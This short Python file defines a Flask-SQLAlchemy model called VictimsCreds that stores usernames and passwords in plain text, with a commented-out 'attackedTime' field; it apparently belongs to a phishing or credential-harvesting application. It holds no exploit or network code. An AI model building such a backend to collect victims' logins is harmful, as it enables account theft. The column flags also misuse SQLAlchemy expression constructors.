import datetime
from flask import Flask
from app import *
# from flask_login import UserMixin
from sqlalchemy.sql.expression import false, true


class VictimsCreds(db.Model):
    ID = db.Column(db.Integer, primary_key=true)
    username = db.Column(db.String(1000), unique=false, nullable=false)
    password = db.Column(db.String(1000), unique=false, nullable=false)
    # attackedTime = db.Column(db.DateTime, default=datetime.datetime.utcnow)
    def __repr__(self):
        return '<User %r>' % self.username
